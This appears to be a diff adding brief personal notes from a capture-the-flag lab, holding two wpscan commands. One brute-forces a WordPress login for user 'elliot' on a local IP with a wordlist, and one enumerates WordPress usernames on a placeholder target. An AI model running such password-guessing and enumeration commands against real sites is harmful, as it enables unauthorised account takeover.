@@ -1,0 +1,6 @@
+
+bruteforcing password
+wpscan --url http://192.168.0.18 --wordlist /location/of/wordlist/fsocitysortunique.dic --username elliot
+
+eenumerating usernames
+	wpscan --url https://target.tld/ --enumerate u
